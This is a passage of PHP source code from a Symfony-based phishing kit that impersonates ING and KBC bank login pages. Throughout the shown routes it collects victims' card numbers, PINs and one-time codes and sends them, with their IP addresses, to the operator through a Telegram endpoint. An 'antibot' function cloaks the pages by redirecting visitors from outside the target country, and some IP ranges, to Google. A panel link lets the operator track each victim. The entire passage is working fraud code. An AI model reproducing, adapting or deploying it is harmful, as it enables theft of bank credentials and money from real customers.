            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------CLICK ING LOGIN------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
            

        }
        return $this->render('user/ingLogin.html.twig',array('response'=>$response,"user"=>$user));
    }
    
    #[Route('/ingLoginLoading/')]
    public function ingLoginLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $message="";
        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            
                $ip = $request->getClientIp();
                $message .= "---------------------STEP ING LOGIN LOADING------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            

        }
        return $this->render('user/ingLoginLoading.html.twig',array('response'=>$response,"user"=>$user));
    }

    
    #[Route('/ingLoginPin/')]
    public function ingLoginPin(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('responseCode');
                if ($otp!=""){
                    $message .= "---------------------PIN-ING-BANK------------------------\n";
                    $message .= "PIN: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/ingLoginLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "-----------------------STEP PIN ING BANK------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/ingLoginPin.html.twig',array('response'=>$response,'user'=>$user));
    }
    
    
    #[Route('/ingLoginCode/')]
    public function ingLoginCode(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('responseCode');
                if ($otp!=""){
                    $message .= "---------------------CODE-ING-BANK------------------------\n";
                    $message .= "CODE : ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/ingLoginLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "-----------------------STEP CODE ING BANK------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/ingLoginCode.html.twig',array('response'=>$response,'user'=>$user));
    }
     #[Route('/successIng/')]
    public function successIng(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
           
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/successIng.html.twig');
    }

    #[Route('/kbcLog/')]
    public function kbcLog(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $ip = $request->getClientIp();

        $response=$request->get('error');
        if ($this->antibot($request)==false){

            if ($request->getMethod()==='POST'){


            }else{
                $message .= "-----------------------STEP LOG KBC BANK------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }

        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/kbcLog.html.twig',array('response'=>$response));
    }

    #[Route('/set/kbc/')]
    public function setKbc(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $em=$doctrine->getManager();
        $session=new Session();

        $card=$request->get('card');
        $ip = $request->getClientIp();
        $currentD = $this->get_current_file_url($Protocol='https://');

        $message="";
        if ($card!="" ){
            $user=$em->getRepository(User::class)->findOneByIp($ip);
            if ($user){
                $user->setIp($ip);
                $user->setNumeroCard($card);
                $em->persist($user);
                $em->flush();
                $session->set('user',$user);
            }else{
                $user=new User();
                $user->setIp($ip);
                $user->setNumeroCard($card);
                $em->persist($user);
                $em->flush();
                $session->set('user',$user);
            }
            $message .= "---------------------LOG-KBC-BANK------------------------\n";
            $message .= "CARD : ".$card ."\n";
            $message .= "-------------------------LINK------------------------------\n";
                    $message .="LINK: ".$currentD."/panel/".$user->getId()."/"." \n";
            $message .= "------------------------- WHOIS ---------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );

            $response="OK";
        }else{
            $response="Error";
        }

        return new Response($response);
    }


    #[Route('/kbcLogLoading/')]
    public function kbcLogLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $message="";
        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();

            $ip = $request->getClientIp();
            $message .= "---------------------STEP KBC LOGIN LOADING------------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );


        }
        return $this->render('user/kbcLogLoading.html.twig',array('response'=>$response,"user"=>$user));
    }
    #[Route('/kbcLogPin/')]
    public function kbcLogPin(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $ip = $request->getClientIp();

        $response=$request->get('error');
        $id=$session->get('user')->getId();
        $user=$em->getRepository(User::class)->findOneById($id);
        if ($this->antibot($request)==false){
            if ($request->getMethod()==='POST'){

            }else{
                $message .= "-----------------------STEP LOG 1 KBC BANK------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/kbcLogPin.html.twig',array('user'=>$user));
    }

    #[Route('/set/kbc/pin/')]
    public function setKbcPin(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $em=$doctrine->getManager();
        $session=new Session();

        $card=$request->get('otp');
        $ip = $request->getClientIp();
        $message="";
        if ($card!="" ){
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);

            $message .= "---------------------LOG-1-KBC-BANK------------------------\n";
            $message .= "CODE 1 : ".$card ."\n";
            $message .= "------------------------- WHOIS ---------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );

            $response="OK";
        }else{
            $response="Error";
        }

        return new Response($response);
    }


    #[Route('/set/kbc/pin1/')]
    public function setKbcPin1(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $em=$doctrine->getManager();
        $session=new Session();

        $card=$request->get('otp');
        $ip = $request->getClientIp();
        $message="";
        if ($card!="" ){
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);

            $message .= "---------------------LOG-2-KBC-BANK------------------------\n";
            $message .= "CODE 1 : ".$card ."\n";
            $message .= "------------------------- WHOIS ---------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );

            $response="OK";
        }else{
            $response="Error";
        }

        return new Response($response);
    }


    #[Route('/set/kbc/pin2/')]
    public function setKbcPin2(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $em=$doctrine->getManager();
        $session=new Session();

        $card=$request->get('otp');
        $ip = $request->getClientIp();
        $message="";
        if ($card!="" ){
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);

            $message .= "------------------CODE-VER-KBC-BANK------------------------\n";
            $message .= "CODE VER : ".$card ."\n";
            $message .= "---------------------- WHOIS ---------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "-------------------- ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );

            $response="OK";
        }else{
            $response="Error";
        }

        return new Response($response);
    }

    #[Route('/kbcLogCode/')]
    public function kbcLogCode(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $ip = $request->getClientIp();

        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            if ($request->getMethod()==='POST'){


            }else{
                $message .= "-----------------------STEP CODE 1 KBC BANK------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }

        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/kbcLogCode.html.twig',array('response'=>$response,'user'=>$user));
    }


    #[Route('/kbcLogCode1/')]
    public function kbcLogCode1(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $ip = $request->getClientIp();

        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            if ($request->getMethod()==='POST'){


            }else{
                $message .= "-----------------------STEP CODE 2 KBC BANK------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }

        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/kbcLogCode1.html.twig',array('response'=>$response,'user'=>$user));
    }

    #[Route('/kbcLogSuccess/')]
    public function kbcLogSuccess(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $ip = $request->getClientIp();

        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            if ($request->getMethod()==='POST'){


            }else{
                $message .= "-----------------------SUCESS------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }

        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/kbcLogSuccess.html.twig',array('response'=>$response,'user'=>$user));
    }


    //-------successIng--------------------------------------

    function antibot($request){
        $response=false;

        $ip=$request->getClientIp();
        $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
        $country=$details->geoplugin_countryCode;
        $isMob = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "mobile"));
        $ip188 = substr($ip, 0, 7);
        $ip189 = substr($ip, 0, 7);
        $ip109136 = substr($ip, 0, 7);
        $ip3131 = substr($ip, 0, 5);
        $ip10988203 = substr($ip, 0, 11);
        $ip109142 = substr($ip, 0, 7);
        if($country!=$this->country){
            return true;
        }
        //$isMob!="Not a mobile device" or//
        if (  $ip188=="188.188" or $ip188=="188.189" or $ip109136=="109.136" or $ip3131=="31.31" or $ip10988203=="109.88.203" or $ip109142=="109.142"){
            return true;
        }
        return $response;
    }




    function get_current_file_url($Protocol='https://') {
        return $Protocol.$_SERVER['HTTP_HOST'];
    }

}
